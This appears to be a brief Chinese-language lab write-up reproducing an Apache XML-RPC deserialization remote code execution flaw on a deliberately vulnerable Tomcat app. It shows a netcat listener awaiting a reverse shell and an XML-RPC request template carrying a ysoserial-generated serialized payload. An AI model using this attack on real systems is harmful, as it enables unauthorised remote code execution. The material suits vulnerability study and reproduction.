## Apache XML-RPC远程代码执行漏洞

#### 1.环境搭建

参考<https://0ang3el.blogspot.ru/2016/07/beware-of-ws-xmlrpc-library-in-your.html>

a.将[unsafe-xmlrpc.war](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/tomcat/cve-2016-5003/unsafe-xmlrpc.war)放到tomcat的webapps目录下

b.启动tomcat

#### 2.漏洞复现

###### 2.1.使用ysoserial生成payload

###### 2.2.攻击机监听8888端口 

```
nc -lvvp 8888
```

###### 2.3攻击机访问http://your-ip:8080/unsafe-xmlrpc/xmlrpc post构造好的payload

```
<?xml version="1.0" encoding="UTF8"?>
<methodCall>
	<methodName>xxx</methodName>
	<params>
		<param>
			<value>
				<struct>
					<member>
						<name>xx</name>
						<value>
							<serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">ysoserial生成的payload</serializable>
						</value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
```

![](1.png)

3.问题现象

![](2.png)

